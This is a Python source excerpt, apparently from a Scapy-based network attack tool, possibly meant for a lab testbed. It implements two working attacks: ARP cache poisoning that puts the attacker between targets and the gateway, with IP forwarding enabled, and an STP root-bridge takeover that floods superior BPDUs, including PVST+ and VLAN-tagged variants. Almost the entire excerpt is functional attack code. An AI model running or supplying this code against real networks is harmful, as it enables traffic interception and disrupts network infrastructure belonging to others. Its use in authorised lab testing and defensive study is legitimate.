def arpspoof_cmd(args):
    need_root()
    iface = args.iface
    attacker = my_mac(iface)
    gw = args.gateway or gateway_of(iface)
    if not gw:
        die("no gateway found; pass --gateway")
    targets = args.targets or [gw]
    old_fwd = get_ip_forward()
    set_ip_forward(True)

    macs = {}
    for t in set(targets + [gw]):
        m = resolve_mac(t, iface)
        if not m:
            set_ip_forward(old_fwd)
            die(f"cannot resolve MAC for {t} on {iface}")
        macs[t] = m

    print(f"[*] poisoning on {iface} (attacker {attacker}); "
          "watch effects on eth1 side / victim traffic")
    for t in targets:
        print(f"    {t} <-> {gw}")

    def body(stopped):
        try:
            while not stopped():
                for t in targets:
                    sendp(Ether(dst=macs[t]) /
                          ARP(op=2, psrc=gw, hwsrc=attacker, pdst=t,
                              hwdst=macs[t]), iface=iface, verbose=0)
                    if t != gw:
                        sendp(Ether(dst=macs[gw]) /
                              ARP(op=2, psrc=t, hwsrc=attacker, pdst=gw,
                                  hwdst=macs[gw]), iface=iface, verbose=0)
                time.sleep(1.0)
        finally:
            print("\n[*] restoring ARP caches...")
            for t in targets:
                sendp(Ether(dst=macs[t]) /
                      ARP(op=2, psrc=gw, hwsrc=macs[gw], pdst=t,
                          hwdst=macs[t]), iface=iface, count=4, verbose=0)
                if t != gw:
                    sendp(Ether(dst=macs[gw]) /
                          ARP(op=2, psrc=t, hwsrc=macs[t], pdst=gw,
                              hwdst=macs[gw]), iface=iface, count=4,
                          verbose=0)
            set_ip_forward(old_fwd)
            print("[*] restored.")

    stop_loop(body)

# ---------------------------------------------------------------- stproot


def stp_frames(m, prio, tag=None, pvst=True):
    """Build superior-BPDU frame sets. Returns (untagged, tagged)."""
    ext = tag or 0
    bpdu = STP(proto=0, version=0, bpdutype=0, bpduflags=0x7E,
               rootid=(prio << 8) | ext, rootmac=m, pathcost=0,
               bridgeid=(prio << 8) | ext, bridgemac=m,
               portid=0x8001, age=0, hellotime=1, maxage=6, fwddelay=4)
    untagged = [Ether(dst="01:80:c2:00:00:00", src=m) /
                LLC(dsap=0x42, ssap=0x42, ctrl=3) / bpdu]
    tagged = []
    if pvst:
        untagged.append(Ether(dst="01:00:0c:cc:cc:cd", src=m) /
                        LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
                        SNAP(OUI=0x00000C, code=0x010B) / bpdu)
    if tag:
        tagged = [Ether(dst=f.dst, src=m) / Dot1Q(vlan=tag) / f.payload
                  for f in untagged]
    return untagged, tagged


def stproot_cmd(args):
    need_root()
    pif = parent_of(args.iface)
    m = my_mac(pif)
    frames_untagged, frames_tagged = stp_frames(m, args.prio, tag=args.tag,
                                                pvst=args.pvst)

    print(f"[*] claiming STP root (prio {args.prio}) on {pif}"
          + (f" + VLAN {args.tag} (PVST+ tagged)" if args.tag else "")
          + "; Ctrl-C to stop. Compare root on watch leg.")
    while True:
        sendp(frames_untagged, iface=pif, verbose=0)
        if frames_tagged:
            sendp(frames_tagged, iface=pif, verbose=0)
        time.sleep(args.interval)

